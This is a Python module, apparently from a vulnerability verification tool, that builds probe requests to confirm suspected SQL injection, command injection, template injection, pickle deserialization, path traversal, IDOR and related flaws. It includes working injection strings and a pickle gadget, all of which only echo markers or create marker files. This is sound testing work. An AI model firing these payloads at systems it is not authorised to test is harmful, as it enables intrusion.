"""九类验证用例模板与命中判定（DESIGN.md 5.3、FR-009、FR-010）。

每个用例只做“能否触发”的判定：探针里只放算式或随机名，响应中出现计算结果、
标记或标记文件才算命中。用例 JSON 可原样重放。
"""

from __future__ import annotations

import ast
import base64
import pickle
import re
import uuid
from dataclasses import dataclass, field
from pathlib import PurePosixPath
from typing import Any

from app.models.enums import Category
from app.project.pysource import ProjectIndex, const_str
from app.verify.params import extract_params, select_columns

MAX_DEBUG_ATTEMPTS = 8
SQL_FALLBACK_COLUMNS = range(1, 7)
SECRET_NAME = re.compile(r"secret|passw(?:or)?d|token|api_?key|private_?key|signing_?key", re.IGNORECASE)
MIN_SECRET_LEN = 8
SAFE_UPLOAD_DIRS = {"upload", "uploads"}

PICKLE_PATH = "/tmp"
PROBE_ROOT = "/work/app"


class _OpenFile:
    """反序列化探针：pickle 加载时调用内置 open，在 /tmp 创建标记文件。"""

    def __init__(self, path: str) -> None:
        self.path = path

    def __reduce__(self):
        return (open, (self.path, "w"))


@dataclass
class AuthInfo:
    admin: dict[str, str] | None = None
    user: dict[str, str] | None = None
    peer_id: int | None = None
    peer_marker: str | None = None

    def headers(self, access: str) -> dict[str, str] | None:
        if access == "admin":
            return self.admin
        if access == "user":
            return self.user
        return {}


@dataclass
class ProbeCase:
    finding_id: int
    code: str
    category: Category
    requests: list[dict[str, Any]]
    rules: list[dict[str, Any]]
    description: str
    # 记录用例之间共享的测试账号标记，便于日志说明
    tags: dict[str, str] = field(default_factory=dict)


def marker() -> str:
    return uuid.uuid4().hex[:10].upper()


def _assigned_name(target: ast.expr) -> str | None:
    if isinstance(target, ast.Name):
        return target.id
    if isinstance(target, ast.Attribute):
        return target.attr
    if isinstance(target, ast.Subscript):
        return const_str(target.slice)
    return None


def hardcoded_secret_values(index: ProjectIndex) -> list[tuple[str, str]]:
    """源码里赋值给密钥类名称的字符串常量，用于判断响应是否泄露了它们。"""
    values: dict[str, str] = {}
    for module in index.modules.values():
        for node in ast.walk(module.tree):
            if isinstance(node, ast.Assign) and isinstance(node.value, ast.Constant):
                value = node.value.value
                if not isinstance(value, str) or len(value) < MIN_SECRET_LEN:
                    continue
                for target in node.targets:
                    name = _assigned_name(target)
                    if name and SECRET_NAME.search(name):
                        values.setdefault(value, name)
    return [(name, value) for value, name in values.items()]


def _base_url(facts: dict[str, Any]) -> tuple[int, str]:
    entry = facts.get("entry") or {}
    return int(entry.get("port") or 5000), entry.get("file") or "app.py"


def _request(
    facts: dict[str, Any],
    path: str,
    *,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    query: dict[str, str] | None = None,
    body: dict[str, Any] | None = None,
    checks: dict[str, Any] | None = None,
    timeout_s: int = 8,
) -> dict[str, Any]:
    port, _ = _base_url(facts)
    # 路由里的类型转换参数按 1 填，具体编号由 IDOR 用例自行替换
    path = re.sub(r"<[^>]+>", "1", path)
    request: dict[str, Any] = {"port": port, "method": method.upper(), "path": path, "timeout_s": timeout_s}
    if headers:
        request["headers"] = headers
    if query:
        request["query"] = query
    if body:
        request["body"] = body
    if checks:
        request["checks"] = checks
    return request


def _attach_param(request: dict[str, Any], container: str, name: str, value: str) -> None:
    if container == "query":
        request.setdefault("query", {})[name] = value
    elif container == "json":
        request.setdefault("body", {"kind": "json", "data": {}})["data"][name] = value
    else:
        request.setdefault("body", {"kind": "form", "data": {}})["data"][name] = value


def _first_param(params) -> tuple[str, str] | None:
    for container in ("query", "form", "json", "files"):
        values = getattr(params, container)
        if values:
            return container, values[0]
    return None


def _handler_text(index: ProjectIndex, route: dict[str, Any], steps: list[dict[str, Any]]) -> str:
    parts = [step.get("snippet") or "" for step in steps]
    facts_route = route or {}
    handler = facts_route.get("handler")
    module = facts_route.get("module")
    if handler and module:
        fn = index.functions.get((module, handler))
        if fn is not None:
            parts.append(index.function_source(fn))
    return "\n".join(parts)


def _rules(*items: dict[str, Any]) -> list[dict[str, Any]]:
    return [item for item in items if item]


def _route_request(
    facts: dict[str, Any], finding: dict[str, Any], auth: AuthInfo
) -> tuple[dict[str, Any], dict[str, str]] | None:
    route = finding.get("route") or {}
    if not route.get("path"):
        return None
    headers = auth.headers(route.get("access", "anonymous"))
    if headers is None:
        return None
    method = (route.get("methods") or ["GET"])[0]
    return _request(facts, route["path"], method=method, headers=headers), headers


def build_sql_case(
    facts: dict[str, Any], finding: dict[str, Any], params, text: str, auth: AuthInfo
) -> ProbeCase | None:
    built = _route_request(facts, finding, auth)
    if built is None:
        return None
    base, _headers = built
    token = marker()
    placement = None
    method = (finding.get("route") or {}).get("methods") or ["GET"]
    if params.query and method[0].upper() == "GET":
        placement = ("query", params.query[0])
    elif params.form:
        placement = ("form", params.form[0])
    elif params.json:
        placement = ("json", params.json[0])
    elif params.query:
        placement = ("query", params.query[0])
    if placement is None:
        return None

    columns = select_columns(text) or None
    counts = [columns] if columns else list(SQL_FALLBACK_COLUMNS)
    requests: list[dict[str, Any]] = []
    for count in counts:
        projection = [f"'{token}'||sqlite_version()", *(str(i) for i in range(2, count + 1))]
        payload = f"' UNION SELECT {', '.join(projection)}-- "
        request = {**base, "query": dict(base.get("query") or {})}
        request.pop("body", None)
        _attach_param(request, placement[0], placement[1], payload)
        requests.append(request)
    return ProbeCase(
        finding["id"], finding["code"], Category.SQL_INJECTION, requests,
        _rules({"kind": "regex", "pattern": re.escape(token) + r"\d+\.\d+\.\d+"}),
        "UNION 注入数据库版本函数",
    )  # fmt: skip


def build_config_case(
    facts: dict[str, Any], finding: dict[str, Any], secrets: list[tuple[str, str]], auth: AuthInfo
) -> ProbeCase | None:
    built = _route_request(facts, finding, auth)
    if built is None or not secrets:
        return None
    base, _headers = built
    rules = [
        {"kind": "contains", "value": value, "label": f"响应包含 {name}"} for name, value in secrets
    ]
    return ProbeCase(
        finding["id"], finding["code"], Category.CONFIG_EXPOSURE, [base], rules, "未鉴权接口是否返回源码中的密钥"
    )


def build_debug_case(
    facts: dict[str, Any], finding: dict[str, Any], index: ProjectIndex, auth: AuthInfo
) -> ProbeCase | None:
    requests: list[dict[str, Any]] = []
    for route in (facts.get("routes") or []):
        if route.get("access") != "anonymous":
            continue
        text = _handler_text(index, route, [])
        params = extract_params(text, route["path"])
        picked = _first_param(params)
        if picked is None:
            continue
        method = (route.get("methods") or ["GET"])[0]
        request = _request(facts, route["path"], method=method)
        if picked[0] == "files":
            continue
        # 触发 500：把引号塞进第一个参数，SQL 或数字解析错误会走到调试页
        _attach_param(request, picked[0], picked[1], "'")
        requests.append(request)
        if len(requests) >= MAX_DEBUG_ATTEMPTS:
            break
    if not requests:
        return None
    return ProbeCase(
        finding["id"], finding["code"], Category.DEBUG_MODE, requests,
        _rules({"kind": "regex", "pattern": r"Werkzeug Debugger|__debugger__"}),
        "构造异常参数请求调试页",
    )  # fmt: skip


def build_command_case(
    facts: dict[str, Any], finding: dict[str, Any], params, auth: AuthInfo
) -> ProbeCase | None:
    built = _route_request(facts, finding, auth)
    if built is None:
        return None
    base, _headers = built
    picked = ("form", params.form[0]) if params.form else _first_param(params)
    if picked is None:
        return None
    token = marker()
    a, b = 1000 + uuid.uuid4().int % 9000, 1000 + uuid.uuid4().int % 9000
    payload = f"; echo {token}$(({a}+{b})); touch /tmp/{token}"
    request = {**base, "query": dict(base.get("query") or {})}
    _attach_param(request, picked[0], picked[1], payload)
    return ProbeCase(
        finding["id"], finding["code"], Category.COMMAND_INJECTION, [request],
        _rules(
            {"kind": "contains", "value": f"{token}{a + b}"},
            {"kind": "file", "path": f"/tmp/{token}"},
        ),
        "回显算式结果或在 /tmp 创建标记文件",
    )  # fmt: skip


def build_template_case(
    facts: dict[str, Any], finding: dict[str, Any], params, auth: AuthInfo
) -> ProbeCase | None:
    built = _route_request(facts, finding, auth)
    if built is None:
        return None
    base, _headers = built
    picked = ("form", params.form[0]) if params.form else _first_param(params)
    if picked is None:
        return None
    token = marker()
    a, b = 1000 + uuid.uuid4().int % 9000, 100 + uuid.uuid4().int % 900
    payload = token + "{{" + f"{a}*{b}" + "}}"
    request = {**base, "query": dict(base.get("query") or {})}
    _attach_param(request, picked[0], picked[1], payload)
    return ProbeCase(
        finding["id"], finding["code"], Category.TEMPLATE_INJECTION, [request],
        _rules({"kind": "contains", "value": f"{token}{a * b}"}),
        "模板算式渲染结果",
    )  # fmt: skip


def build_deserialization_case(
    facts: dict[str, Any], finding: dict[str, Any], params, auth: AuthInfo
) -> ProbeCase | None:
    built = _route_request(facts, finding, auth)
    if built is None:
        return None
    base, _headers = built
    field_name = params.files[0] if params.files else "file"
    token = marker()
    path = f"{PICKLE_PATH}/{token}"
    content = pickle.dumps(_OpenFile(path))
    request = {
        **base,
        "body": {
            "kind": "multipart",
            "files": [{
                "field": field_name,
                "filename": "probe.pkl",
                "content_type": "application/octet-stream",
                "content_b64": base64.b64encode(content).decode("ascii"),
            }],
        },
        "checks": {"files_exist": [path]},
    }
    return ProbeCase(
        finding["id"], finding["code"], Category.DESERIALIZATION, [request],
        _rules({"kind": "file", "path": path}),
        "pickle 载荷在 /tmp 创建标记文件",
    )  # fmt: skip


def build_path_traversal_case(
    facts: dict[str, Any], finding: dict[str, Any], params, auth: AuthInfo
) -> ProbeCase | None:
    built = _route_request(facts, finding, auth)
    if built is None:
        return None
    base, _headers = built
    field_name = params.files[0] if params.files else "file"
    token = marker()
    filename = f"{token}.txt"
    request = {
        **base,
        "body": {
            "kind": "multipart",
            "files": [{
                "field": field_name,
                "filename": f"../{filename}",
                "content_type": "text/plain",
                "content_b64": base64.b64encode(b"probe\n").decode("ascii"),
            }],
        },
        "checks": {"find": {"root": PROBE_ROOT, "name": filename}},
    }
    return ProbeCase(
        finding["id"], finding["code"], Category.PATH_TRAVERSAL, [request],
        _rules({"kind": "found_outside", "dirs": sorted(SAFE_UPLOAD_DIRS)}),
        "带 ../ 的文件名是否写到上传目录之外",
    )  # fmt: skip


def build_idor_case(
    facts: dict[str, Any], finding: dict[str, Any], auth: AuthInfo
) -> ProbeCase | None:
    route = finding.get("route") or {}
    path = route.get("path") or ""
    names = re.findall(r"<(?:[a-zA-Z_]+:)?([a-zA-Z_][a-zA-Z0-9_]*)>", path)
    if not names or auth.user is None or auth.peer_id is None or not auth.peer_marker:
        return None
    target_path = re.sub(r"<[^>]+>", str(auth.peer_id), path, count=1)
    request = _request(facts, target_path, method=(route.get("methods") or ["GET"])[0], headers=auth.user)
    return ProbeCase(
        finding["id"], finding["code"], Category.IDOR, [request],
        _rules({"kind": "contains", "value": auth.peer_marker}),
        "用账号 A 请求账号 B 的资源",
    )  # fmt: skip


def build_missing_auth_case(
    facts: dict[str, Any], finding: dict[str, Any], auth: AuthInfo
) -> ProbeCase | None:
    route = finding.get("route") or {}
    if not route.get("path") or not auth.peer_marker:
        return None
    request = _request(facts, route["path"], method=(route.get("methods") or ["GET"])[0])
    return ProbeCase(
        finding["id"], finding["code"], Category.MISSING_AUTH, [request],
        _rules({"kind": "contains", "value": auth.peer_marker}),
        "匿名请求是否返回测试账号的数据",
    )  # fmt: skip


def build_cases(
    findings: list[dict[str, Any]],
    steps_by_finding: dict[int, list[dict[str, Any]]],
    index: ProjectIndex,
    facts: dict[str, Any],
    auth: AuthInfo,
    secrets: list[tuple[str, str]],
) -> tuple[list[ProbeCase], list[tuple[dict[str, Any], str]]]:
    """按类别生成用例；无法生成时给出原因，对应的漏洞保持疑似。"""
    cases: list[ProbeCase] = []
    skipped: list[tuple[dict[str, Any], str]] = []
    for finding in findings:
        category = Category(finding["category"])
        steps = steps_by_finding.get(finding["id"], [])
        text = _handler_text(index, finding.get("route") or {}, steps)
        params = extract_params(text, (finding.get("route") or {}).get("path") or "")
        built: ProbeCase | None = None
        if category == Category.SQL_INJECTION:
            built = build_sql_case(facts, finding, params, text, auth)
        elif category == Category.CONFIG_EXPOSURE:
            built = build_config_case(facts, finding, secrets, auth)
        elif category == Category.DEBUG_MODE:
            built = build_debug_case(facts, finding, index, auth)
        elif category == Category.COMMAND_INJECTION:
            built = build_command_case(facts, finding, params, auth)
        elif category == Category.TEMPLATE_INJECTION:
            built = build_template_case(facts, finding, params, auth)
        elif category == Category.DESERIALIZATION:
            built = build_deserialization_case(facts, finding, params, auth)
        elif category == Category.PATH_TRAVERSAL:
            built = build_path_traversal_case(facts, finding, params, auth)
        elif category == Category.IDOR:
            built = build_idor_case(facts, finding, auth)
        elif category == Category.MISSING_AUTH:
            built = build_missing_auth_case(facts, finding, auth)
        else:
            skipped.append((finding, "只能静态发现"))
            continue
        if built is None:
            skipped.append((finding, _skip_reason(category, finding, params, auth)))
        else:
            cases.append(built)
    return cases, skipped


def _skip_reason(category: Category, finding: dict[str, Any], params, auth: AuthInfo) -> str:
    route = finding.get("route") or {}
    access = route.get("access")
    if category in (Category.IDOR, Category.MISSING_AUTH) and auth.peer_marker is None:
        return "工程没有可用的注册接口，无法准备两个测试账号"
    if category == Category.IDOR and auth.peer_id is None:
        return "测试账号的编号未知"
    if access == "admin" and auth.admin is None:
        return "未获得管理员登录态"
    if access == "user" and auth.user is None:
        return "未获得普通用户登录态"
    if category == Category.DEBUG_MODE:
        return "没有可触发异常的匿名接口"
    if params.empty() and category not in (Category.CONFIG_EXPOSURE,):
        return "未能从代码中定位请求参数"
    return "缺少可执行的验证用例"


def _safe_upload_path(path: str, safe_dirs: set[str]) -> bool:
    return any(part.lower() in safe_dirs for part in PurePosixPath(path).parts[:-1])


def evaluate(rules: list[dict[str, Any]], result: Any) -> str | None:
    """返回命中特征；未命中返回 None。"""
    for rule in rules:
        kind = rule.get("kind")
        label = rule.get("label")
        if kind == "contains":
            value = rule.get("value") or ""
            if value and value in result.body:
                return str(label or value)
        elif kind == "regex":
            match = re.search(rule.get("pattern") or "", result.body)
            if match:
                return str(label or match.group(0))
        elif kind == "file":
            if result.files_exist.get(rule.get("path")):
                return str(label or f"文件 {rule.get('path')} 存在")
        elif kind == "found_outside":
            safe_dirs = set(rule.get("dirs") or SAFE_UPLOAD_DIRS)
            for path in result.found:
                if not _safe_upload_path(path, safe_dirs):
                    return str(label or f"文件出现在 {path}")
        elif kind == "any":
            matched = evaluate(rule.get("rules") or [], result)
            if matched:
                return matched
    return None
